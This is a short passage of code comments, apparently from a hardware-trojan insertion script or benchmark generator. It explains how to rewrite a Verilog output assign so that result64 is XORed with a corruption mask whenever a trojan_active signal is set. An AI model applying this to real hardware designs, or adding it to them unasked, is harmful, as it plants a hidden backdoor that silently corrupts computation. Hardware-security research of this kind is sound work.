...
//
// IMPORTANT: result64 may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If result64 is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for result64 (or first output assign):
//     assign result64 = <expr>;
//   Replace with:
//     assign result64 = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
